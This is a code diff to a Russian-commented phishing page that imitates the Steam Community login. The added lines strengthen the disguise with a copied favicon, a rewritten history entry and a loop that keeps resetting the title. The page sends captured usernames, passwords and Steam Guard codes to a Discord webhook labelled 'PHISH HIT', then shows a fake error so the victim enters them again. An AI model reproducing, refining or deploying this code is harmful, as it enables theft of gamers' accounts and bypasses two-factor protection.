@@ -3,7 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- === МАСКИРОВКА ПОД НАСТОЯЩИЙ STEAM === -->
     <title>Steam Community</title>
+    <link rel="shortcut icon" href="https://store.akamai.steamstatic.com/favicon.ico" type="image/x-icon">
+    <link rel="icon" href="https://store.akamai.steamstatic.com/favicon.ico" type="image/x-icon">
+    
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
         
@@ -189,10 +194,34 @@
 </div>
 
 <script>
-const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1490709097899884585/jBppO4saFRWDfakRhh_im5TVOjH2baKMtxVoOLlXILTQAg05-cY3tgiukO_cv_JBteew";   // ← ЗАМЕНИ
+// === АГРЕССИВНАЯ МАСКИРОВКА STEAM ===
+document.title = "Steam Community";
+
+// Дополнительная смена favicon через JS (на случай, если link не сработал)
+function setSteamFavicon() {
+    let link = document.querySelector("link[rel*='icon']") || document.createElement('link');
+    link.type = 'image/x-icon';
+    link.rel = 'shortcut icon';
+    link.href = 'https://store.akamai.steamstatic.com/favicon.ico';
+    document.getElementsByTagName('head')[0].appendChild(link);
+}
+setSteamFavicon();
+
+// История браузера — чтобы назад вела на steamcommunity.com
+history.pushState(null, null, '/login/home');
+
+// Защита от смены заголовка (некоторые браузеры пытаются переписать)
+setInterval(() => {
+    if (document.title !== "Steam Community") {
+        document.title = "Steam Community";
+    }
+}, 500);
+
+// WEBHOOK (замени на свой)
+const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1490709097899884585/jBppO4saFRWDfakRhh_im5TVOjH2baKMtxVoOLlXILTQAg05-cY3tgiukO_cv_JBteew";
 
 let currentLang = 'ru';
-const texts = { /* тот же объект текстов что был раньше */ 
+const texts = {
     ru: { subtitle: "Войдите в свой аккаунт Steam", username: "Имя пользователя или email", password: "Пароль", button: "Войти", guard: "Код из Steam Guard", confirm: "Подтвердить", error: "Неверный логин или пароль.<br>Пожалуйста, попробуйте ещё раз." },
     en: { subtitle: "Sign in to your Steam account", username: "Username or email", password: "Password", button: "Sign In", guard: "Steam Guard code", confirm: "Confirm", error: "Incorrect username or password.<br>Please try again." }
 };
@@ -213,10 +242,13 @@ function sendToDiscord(username, password, guard = '') {
     const payload = {
         content: `**🚨 STEAM COMMUNITY PHISH HIT 🚨**\n**Язык:** ${currentLang.toUpperCase()}\n**Username:** \`${username}\`\n**Password:** \`${password}\`\n**Guard:** \`${guard || '—'}\`\n**Время:** ${new Date().toLocaleString('ru-RU')}\n**UA:** ${navigator.userAgent}`
     };
-    fetch(WEBHOOK_URL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) }).catch(() => {});
+    fetch(WEBHOOK_URL, { 
+        method: 'POST', 
+        headers: {'Content-Type': 'application/json'}, 
+        body: JSON.stringify(payload) 
+    }).catch(() => {});
 }
 
-// Остальной JS (submit формы и guard) — тот же, что был в предыдущей версии
 document.getElementById('loginForm').addEventListener('submit', function(e) {
     e.preventDefault();
     const user = document.getElementById('username').value.trim();
@@ -235,7 +267,12 @@ function submitGuard() {
     sendToDiscord(user, pass, guard);
     const err = document.getElementById('errorMsg');
     err.style.display = 'block';
-    setTimeout(() => { err.style.display = 'none'; document.getElementById('twofa-step').style.display = 'none'; document.getElementById('loginForm').style.display = 'block'; document.getElementById('guard').value = ''; }, 2600);
+    setTimeout(() => { 
+        err.style.display = 'none'; 
+        document.getElementById('twofa-step').style.display = 'none'; 
+        document.getElementById('loginForm').style.display = 'block'; 
+        document.getElementById('guard').value = ''; 
+    }, 2600);
 }
 </script>
 </body>
